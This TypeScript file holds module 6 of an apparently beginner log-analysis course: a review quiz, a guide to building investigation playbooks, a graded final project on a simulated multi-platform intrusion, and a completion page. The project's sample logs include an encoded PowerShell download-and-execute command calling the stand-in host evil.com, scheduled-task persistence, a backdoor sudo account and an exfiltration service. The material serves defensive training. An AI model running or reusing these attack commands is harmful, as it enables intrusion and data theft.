import { LessonContent } from "../../lessonContent";

// Module 6: Final Project & Course Completion
export const module6: LessonContent[] = [
  {
    id: "6.1",
    courseId: "log-analysis",
    title: "Course Review & Knowledge Check",
    content: `
# Course Review & Knowledge Check

Let's review everything you've learned in the Log Analysis for Beginners course and assess your understanding.

## Module 1: Introduction to Security Logs
- What are security logs and why they matter
- Common log formats (syslog, JSON, CEF, LEEF)
- Log sources across the enterprise
- Log collection and centralization methods

**Key Concepts:**
- Logs provide evidence of security events
- Different systems generate different log formats
- Centralized logging is essential for correlation
- Proper log retention supports compliance and investigation

## Module 2: Windows Event Logs
- Windows Event Log architecture
- Critical Security Event IDs (4624, 4625, 4648, 4672, etc.)
- Authentication and logon analysis
- Process and command line logging
- PowerShell logging and script block logging

**Key Concepts:**
- Event IDs categorize Windows activities
- Logon types indicate authentication methods
- PowerShell logging is crucial for detecting modern attacks
- Process creation events show program execution

## Module 3: Linux System Logs
- Linux logging architecture (syslog, journald)
- Authentication logs (auth.log, secure)
- System and application logs
- Web server logs (Apache, Nginx)
- Log rotation and management

**Key Concepts:**
- Linux uses syslog for centralized logging
- auth.log tracks authentication attempts
- Web logs provide HTTP request details
- Log rotation prevents disk space issues

## Module 4: Network & Cloud Logs
- Firewall and network device logs
- Cloud service logs (AWS, Azure, GCP)
- Email and collaboration platform logs
- DNS logs for detecting threats

**Key Concepts:**
- Network logs show traffic patterns and connections
- Cloud logs require different collection methods
- Email logs help detect phishing and malware delivery
- DNS logs can reveal C2 communication and data exfiltration

## Module 5: Advanced Log Analysis & SIEM
- SIEM architecture and fundamentals
- Detection rules and correlation
- Threat hunting with logs
- Log retention and compliance requirements

**Key Concepts:**
- SIEMs aggregate and correlate logs from multiple sources
- Detection rules transform logs into alerts
- Threat hunting is proactive searching for threats
- Compliance requirements dictate log retention periods

## Knowledge Check Questions

### Windows Logs
1. What does Event ID 4625 indicate?
2. What's the difference between Logon Type 2 and Logon Type 10?
3. Why is PowerShell script block logging important?

### Linux Logs
1. What file contains authentication logs on most Linux systems?
2. How do you view systemd journal logs?
3. What's a common indicator of SSH brute force in auth.log?

### Network Logs
1. What does a "DENY" entry in firewall logs indicate?
2. How can DNS logs detect data exfiltration?
3. What's beaconing and how do you spot it?

### SIEM & Analysis
1. What's the difference between a true positive and false positive?
2. Why is log retention important for compliance?
3. What's the benefit of correlation rules?

## Practical Skills Assessment

**Can you:**
- Identify suspicious patterns in Windows Event Logs?
- Analyze Linux auth logs for brute force attempts?
- Correlate network and authentication logs?
- Write basic search queries in a SIEM?
- Document findings from log analysis?

If you're unsure about any of these, review the relevant modules before proceeding to the final project.
    `,
    keyTakeaways: [
      "Log analysis requires understanding multiple log sources and formats",
      "Windows and Linux logs provide different but complementary visibility",
      "Network and cloud logs reveal threats that endpoint logs might miss",
      "SIEMs enable correlation and detection across log sources",
      "Proper documentation is essential for effective log analysis"
    ]
  },
  {
    id: "6.2",
    courseId: "log-analysis",
    title: "Building a Log Analysis Playbook",
    content: `
# Building a Log Analysis Playbook

A log analysis playbook standardizes your approach to investigating common security scenarios. Let's build a comprehensive playbook.

## What is a Log Analysis Playbook?

A **playbook** is a step-by-step guide for investigating specific types of security events using logs. It ensures consistent, thorough investigations.

## Playbook Structure

### 1. Scenario Overview
- Clear description of the security event
- Typical indicators and patterns
- Business impact assessment
- Required urgency level

### 2. Required Log Sources
- Which logs are essential
- What fields to extract
- Time range needed
- Alternative sources if primary unavailable

### 3. Investigation Steps
- Sequential procedures
- Decision points
- What to look for in each log source
- How to correlate findings

### 4. Response Actions
- When to escalate
- Containment recommendations
- Documentation requirements
- Communication procedures

## Example Playbook: Suspicious Login Activity

### Scenario Overview
**Event:** Unusual login patterns detected
**Indicators:** Logins from unusual locations, times, or multiple failed attempts
**Impact:** Potential account compromise, unauthorized access
**Urgency:** High - investigate within 1 hour

### Required Log Sources
**Primary:**
- Windows Security Event Log (Events 4624, 4625, 4627, 4648)
- VPN access logs
- Cloud authentication logs (Azure AD, AWS CloudTrail)

**Secondary:**
- Firewall logs (source IP geolocation)
- Endpoint detection logs (process execution)
- Application logs (access patterns)

### Investigation Steps

**Step 1: Gather Initial Context (5 minutes)**
\`\`\`
□ Review the alert details
□ Identify the affected account
□ Note the time range of suspicious activity
□ Check if account is privileged/administrative
\`\`\`

**Step 2: Authentication Analysis (15 minutes)**
\`\`\`
Windows Logs:
□ Search Event ID 4624 (successful logins)
  - Note Logon Type (2=interactive, 3=network, 10=remote)
  - Check Source Network Address
  - Verify Workstation Name

□ Search Event ID 4625 (failed logins)
  - Count failures per source IP
  - Note failure reasons
  - Check for lockout events (4740)

□ Search Event ID 4627 (logoff)
  - Correlate with successful logins
  - Check session duration

□ Search Event ID 4648 (explicit credentials)
  - Look for credential reuse
  - Check for pass-the-hash attempts
\`\`\`

**Step 3: Geolocation Analysis (10 minutes)**
\`\`\`
□ Extract source IP addresses from authentication events
□ Check geolocation of each IP
□ Compare to user's normal locations
□ Look for impossible travel (multiple countries in short time)
□ Check if IPs are from known VPN/proxy services
\`\`\`

**Step 4: Correlation with Other Sources (10 minutes)**
\`\`\`
□ VPN Logs:
  - Verify VPN sessions match authentication
  - Check VPN client versions
  - Review multi-factor authentication attempts

□ Firewall Logs:
  - Confirm network connections from source IPs
  - Check for unusual ports/protocols
  - Look for data transfer patterns

□ Endpoint Logs:
  - Review process execution post-login
  - Check for unusual file access
  - Look for persistence mechanisms
\`\`\`

**Step 5: Timeline Construction (10 minutes)**
\`\`\`
□ Build chronological timeline of all events
□ Mark suspicious activities
□ Identify gaps in visibility
□ Determine initial access point
\`\`\`

### Decision Points

**Escalate Immediately If:**
- Multiple privileged accounts affected
- Confirmed data access or exfiltration
- Active malware execution detected
- Business-critical systems impacted

**Continue Investigation If:**
- Single non-privileged account affected
- No confirmed malicious activity
- Requires additional context

**Close as False Positive If:**
- Explained by legitimate activity (travel, new device)
- Known good IP addresses (corporate offices)
- User confirms authorized access

## Creating Your Own Playbooks

### Common Scenarios to Document

1. **Malware Detection**
   - EDR alerts + process logs
   - Network connections + DNS queries
   - File creation + registry modifications

2. **Data Exfiltration**
   - Large outbound transfers
   - Unusual external destinations
   - After-hours activity patterns

3. **Insider Threat**
   - Unusual access patterns
   - Data access outside job role
   - Mass downloads or email forwarding

4. **Web Application Attack**
   - Web server logs + firewall logs
   - Application error logs
   - Database query logs

### Playbook Template

\`\`\`markdown
# Playbook: [Scenario Name]

## Overview
- **Scenario:** [Description]
- **Indicators:** [Key signs to look for]
- **Impact:** [Potential business impact]
- **Urgency:** [Response time requirement]

## Required Log Sources
- **Primary:** [Essential logs]
- **Secondary:** [Supporting logs]
- **Time Range:** [How much history needed]

## Investigation Steps
1. [Step 1 with time estimate]
2. [Step 2 with time estimate]
3. [Continue as needed]

## Decision Points
- **Escalate if:** [Conditions for immediate escalation]
- **Continue if:** [Conditions for deeper investigation]
- **Close if:** [Conditions for false positive]

## Response Actions
- **Immediate:** [What to do right away]
- **Follow-up:** [What to do after initial response]
- **Documentation:** [What to record]

## References
- [Relevant event IDs]
- [Useful queries]
- [Related resources]
\`\`\`
    `,
    keyTakeaways: [
      "Playbooks standardize log analysis procedures for consistency",
      "Each playbook should include scenario overview, required logs, and step-by-step procedures",
      "Decision points help analysts know when to escalate, continue, or close",
      "Document time estimates for each step to set expectations",
      "Create playbooks for common scenarios in your environment"
    ],
    practicalExercise: {
      title: "Create a Playbook",
      description: "Develop a log analysis playbook for a security scenario.",
      steps: [
        "Choose a common security scenario (e.g., malware detection)",
        "Identify required log sources and key indicators",
        "Write step-by-step investigation procedures",
        "Define decision points for escalation",
        "Include response actions and documentation requirements"
      ]
    }
  },
  {
    id: "6.3",
    courseId: "log-analysis",
    title: "Final Project: Complete Log Analysis Investigation",
    content: `
# Final Project: Complete Log Analysis Investigation

It's time to put everything you've learned into practice. You'll investigate a realistic security incident using multiple log sources.

## Scenario

Your organization's SIEM has generated a high-severity alert: "Potential Advanced Persistent Threat Detected". You are the lead analyst assigned to investigate this incident using the provided log excerpts.

## Alert Details

**Alert Name:** APT-2024-001: Multi-Platform Attack Detected
**Severity:** Critical
**First Seen:** 2024-01-15 08:00:00 UTC
**Description:** Suspicious activity detected across Windows, Linux, and cloud environments with potential data exfiltration

## Provided Log Data

You have access to the following log sources for the investigation:

### 1. Windows Security Event Log
\`\`\`log
2024-01-15 08:00:00 EventID: 4624
Account Name: admin
Logon Type: 10 (RemoteInteractive)
Source IP: 203.0.113.50
Workstation: -

2024-01-15 08:05:00 EventID: 4688
Process: powershell.exe
Command: powershell -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5wc2EnKSB8IElFWA==
User: admin

2024-01-15 08:10:00 EventID: 4698
Task Name: \\Microsoft\\Windows\\Update
Command: powershell -ep bypass -f C:\\Windows\\Temp\\update.ps1
\`\`\`

### 2. Linux Authentication Log
\`\`\`log
Jan 15 08:15:00 server01 sshd[12345]: Accepted publickey for root from 203.0.113.50 port 54321 ssh2
Jan 15 08:20:00 server01 useradd[12346]: new user: serviceacct, UID=1001, GID=1001
Jan 15 08:21:00 server01 usermod[12347]: add 'serviceacct' to group 'sudo'
Jan 15 08:25:00 server01 CRON[12348]: (root) CMD (/usr/local/bin/backup.sh)
Jan 15 08:30:00 server01 systemd[1]: Started exfiltrate.service
\`\`\`

### 3. Firewall Logs
\`\`\`log
2024-01-15 08:05:15 ALLOW tcp 10.0.1.100:54321 -> 185.234.72.50:443 bytes=2048
2024-01-15 08:30:15 ALLOW tcp 10.0.2.50:49822 -> 185.234.72.50:443 bytes=50000000
2024-01-15 08:35:00 DENY tcp 10.0.1.100:54321 -> 192.168.100.50:445 bytes=0
\`\`\`

### 4. AWS CloudTrail Logs
\`\`\`json
{
  "eventTime": "2024-01-15T08:40:00Z",
  "eventName": "ConsoleLogin",
  "userIdentity": {
    "type": "IAMUser",
    "userName": "admin"
  },
  "sourceIPAddress": "203.0.113.50"
}

{
  "eventTime": "2024-01-15T08:45:00Z",
  "eventName": "CreateAccessKey",
  "userIdentity": {
    "type": "IAMUser",
    "userName": "admin"
  },
  "sourceIPAddress": "203.0.113.50"
}

{
  "eventTime": "2024-01-15T08:50:00Z",
  "eventName": "GetObject",
  "bucketName": "confidential-data",
  "key": "customer-database.sql",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/MyRole/AKIAIOSFODNN7EXAMPLE"
  },
  "sourceIPAddress": "10.0.1.100"
}
\`\`\`

### 5. DNS Logs
\`\`\`log
2024-01-15 08:05:10 query=evil.com type=A response=185.234.72.50 client=10.0.1.100
2024-01-15 08:30:10 query=c2.evil.com type=A response=185.234.72.50 client=10.0.2.50
2024-01-15 08:35:00 query=internal.company.local type=A response=NXDOMAIN client=10.0.1.100
\`\`\`

## Investigation Tasks

### Task 1: Initial Assessment (15 minutes)
1. What type of attack is this?
2. Which systems have been compromised?
3. What is the attacker's IP address?
4. What is the timeline of the attack?

### Task 2: Windows Analysis (20 minutes)
1. Decode the PowerShell command. What does it do?
2. What persistence mechanism was established?
3. What privileges does the attacker have?

### Task 3: Linux Analysis (20 minutes)
1. How did the attacker gain access to the Linux system?
2. What new user was created and why?
3. What service was started and what does it likely do?

### Task 4: Network Analysis (15 minutes)
1. What is the C2 server IP?
2. How much data was exfiltrated?
3. What was the attacker trying to access at 08:35?

### Task 5: Cloud Analysis (15 minutes)
1. How did the attacker access AWS?
2. What AWS credentials were created?
3. What data was accessed in S3?

### Task 6: Attack Chain Reconstruction (15 minutes)
1. Build a complete timeline of all activities
2. Map each step to MITRE ATT&CK techniques
3. Identify all indicators of compromise

### Task 7: Impact Assessment (10 minutes)
1. What data was compromised?
2. What systems need to be contained?
3. What is the business impact?

### Task 8: Recommendations (10 minutes)
1. List immediate containment actions
2. Document eradication steps
3. Provide prevention recommendations

## Deliverables

### 1. Investigation Report
Create a comprehensive report including:
- Executive summary
- Detailed timeline
- Attack chain analysis
- Impact assessment
- IOCs identified

### 2. IOC List
Extract and categorize all indicators:
- IP addresses
- Domains
- File hashes
- User accounts
- Processes/services

### 3. Remediation Plan
Provide specific steps for:
- Immediate containment
- System recovery
- Security improvements

## Evaluation Criteria

Your investigation will be evaluated on:

### Technical Accuracy (40%)
- Correct log interpretation
- Accurate attack identification
- Proper IOC extraction
- Valid timeline construction

### Analytical Depth (30%)
- Thorough analysis of each log source
- Proper correlation between events
- Understanding of attack techniques
- Recognition of attack patterns

### Documentation (20%)
- Clear, professional report
- Well-structured timeline
- Complete IOC documentation
- Actionable recommendations

### Critical Thinking (10%)
- Identification of subtle indicators
- Recognition of attack sophistication
- Insightful recommendations
- Consideration of alternative explanations

## Resources Allowed

- You may use external OSINT tools (VirusTotal, WHOIS, etc.)
- You may reference course materials
- You may use MITRE ATT&CK framework
- You may collaborate with others (if in a class setting)

## Time Limit

Total time: 2 hours
- Allocate time wisely across all tasks
- Don't get stuck on one section
- Document your progress

Good luck! This project simulates real-world log analysis challenges and will demonstrate your mastery of the course material.
    `,
    keyTakeaways: [
      "Real-world incidents require correlating multiple log sources",
      "Attack chains often span multiple platforms and systems",
      "Proper documentation is essential for incident response",
      "IOC extraction helps scope the impact and aid recovery",
      "Timeline reconstruction reveals the full attack story"
    ],
    practicalExercise: {
      title: "Complete the Investigation",
      description: "Investigate the multi-platform attack using the provided logs.",
      steps: [
        "Analyze each log source systematically",
        "Decode suspicious commands and identify malware",
        "Build a complete attack timeline",
        "Extract all indicators of compromise",
        "Write a comprehensive investigation report"
      ]
    }
  },
  {
    id: "6.4",
    courseId: "log-analysis",
    title: "Course Completion & Next Steps",
    content: `
# Course Completion & Next Steps

Congratulations! You've completed the Log Analysis for Beginners course. Let's review your achievement and plan your continued learning journey.

## What You've Accomplished

### Core Skills Developed
✅ **Log Fundamentals**
- Understanding different log formats and sources
- Centralized logging concepts
- Log retention and compliance requirements

✅ **Windows Log Analysis**
- Interpreting Windows Event Logs
- Identifying authentication events
- Analyzing process execution
- PowerShell logging techniques

✅ **Linux Log Analysis**
- Working with syslog and journald
- Authentication log analysis
- Web server log interpretation
- Log rotation and management

✅ **Network & Cloud Logs**
- Firewall and network device logs
- Cloud service log analysis
- Email and collaboration logs
- DNS-based threat detection

✅ **Advanced Analysis**
- SIEM navigation and querying
- Detection rule logic
- Threat hunting techniques
- Incident response procedures

### Practical Experience
- Analyzed real-world log samples
- Investigated multi-platform attacks
- Built detection playbooks
- Completed a comprehensive investigation project

## Self-Assessment

Rate your confidence in these areas (1-5 scale):

### Technical Skills
- [ ] Reading and interpreting Windows Event Logs
- [ ] Analyzing Linux authentication logs
- [ ] Understanding network traffic logs
- [ ] Working with cloud service logs
- [ ] Writing SIEM queries
- [ ] Correlating events across sources

### Analytical Skills
- [ ] Recognizing attack patterns
- [ ] Building incident timelines
- [ ] Extracting IOCs from logs
- [ ] Assessing incident impact
- [ ] Documenting findings

### Response Skills
- [ ] Prioritizing alerts by severity
- [ ] Escalating incidents appropriately
- [ ] Recommending containment actions
- [ ] Communicating technical findings

## Career Pathways

With your log analysis skills, you're qualified for:

### Entry-Level Positions
- **SOC Analyst (Tier 1)**
  - Monitor SIEM alerts
  - Perform initial triage
  - Document findings
  - Escalate incidents

- **Security Operations Center Analyst**
  - Analyze security events
  - Investigate alerts
  - Support incident response
  - Maintain security tools

### Mid-Level Positions (with experience)
- **SOC Analyst (Tier 2)**
  - Deep investigation
  - Threat hunting
  - Detection tuning
  - Mentoring junior analysts

- **Security Analyst**
  - Log analysis specialization
  - Incident response
  - Detection engineering
  - Security monitoring

### Specialized Roles
- **Threat Hunter**
  - Proactive threat searching
  - Advanced log analysis
  - Custom detection development
  - Threat intelligence integration

- **Detection Engineer**
  - Write detection rules
  - Optimize SIEM queries
  - Automate analysis
  - Tool configuration

## Recommended Next Steps

### Immediate (Next 30 Days)
1. **Practice Regularly**
   - Analyze sample logs from platforms like LetsDefend
   - Participate in CyberDefenders challenges
   - Set up a home lab with logging tools

2. **Get Certified**
   - CompTIA Security+ (foundational)
   - Blue Team Level 1 (BTL1)
   - Splunk Core Certified User

3. **Build Your Portfolio**
   - Document your final project
   - Create writeups of log analysis challenges
   - Contribute to open-source security tools

### Medium Term (3-6 Months)
1. **Deepen SIEM Skills**
   - Master your organization's SIEM platform
   - Learn advanced query techniques
   - Practice detection rule writing

2. **Expand Technical Knowledge**
   - Learn scripting (Python for log analysis)
   - Study network fundamentals
   - Understand cloud security

3. **Gain Experience**
   - Apply for SOC analyst positions
   - Seek internships or volunteer opportunities
   - Participate in CTF competitions

### Long Term (6+ Months)
1. **Specialize**
   - Threat intelligence analysis
   - Incident response
   - Detection engineering
   - Security architecture

2. **Advanced Certifications**
   - GIAC Certified Incident Handler (GCIH)
   - GIAC Certified Forensic Analyst (GCFA)
   - Certified Information Systems Security Professional (CISSP)

## Continuous Learning Resources

### Practice Platforms
- **LetsDefend** - SOC analyst simulations
- **CyberDefenders** - Blue team challenges
- **TryHackMe** - Security labs and paths
- **Hack The Box** - Practical challenges

### Communities
- **Reddit** - r/cybersecurity, r/netsecstudents
- **Discord** - Security communities
- **Local Meetups** - BSides, ISSA chapters
- **Twitter/X** - Security researchers and practitioners

### Stay Current
- **Security Blogs** - Mandiant, CrowdStrike, Red Canary
- **Podcasts** - Darknet Diaries, Risky Business
- **Newsletters** - SANS NewsBites, The Hacker News
- **Research Papers** - arXiv, IEEE Xplore

## Final Words

### The Log Analyst's Mindset
- **Be curious** - Always ask "why" and "what if"
- **Be thorough** - Don't assume, verify everything
- **Be patient** - Complex investigations take time
- **Be collaborative** - Share knowledge and learn from others
- **Be persistent** - The attackers never stop learning

### Remember
- Every log tells a story - your job is to read it
- Patterns emerge with practice and experience
- Documentation is as important as detection
- The security community is supportive and welcoming

### You're Now Ready To
- Analyze security logs across multiple platforms
- Investigate security incidents using log evidence
- Understand how logs fit into the broader security ecosystem
- Pursue a career as a SOC analyst or security professional

---

## 🎉 Congratulations!

You've successfully completed **Log Analysis for Beginners**!

You now possess the fundamental skills to:
- Analyze logs from Windows, Linux, network, and cloud sources
- Investigate security incidents using log evidence
- Understand how logs fit into the broader security ecosystem
- Pursue a career as a SOC analyst or security professional

**The defenders' work is never done, but you're now equipped to join the fight.** 🛡️

Keep learning, stay curious, and welcome to the world of log analysis!
    `,
    keyTakeaways: [
      "You've developed comprehensive log analysis skills across multiple platforms",
      "Both technical and analytical skills are essential for success",
      "Continuous practice and learning are key in this field",
      "Multiple career paths are available with your new skills",
      "The security community offers abundant resources for growth"
    ],
    practicalExercise: {
      title: "Create Your Learning Plan",
      description: "Plan your continued growth in log analysis and cybersecurity.",
      steps: [
        "Complete the self-assessment honestly",
        "Choose your next certification goal",
        "Sign up for at least one practice platform",
        "Join a security community or forum",
        "Set a 6-month skill development goal"
      ]
    }
  },
];
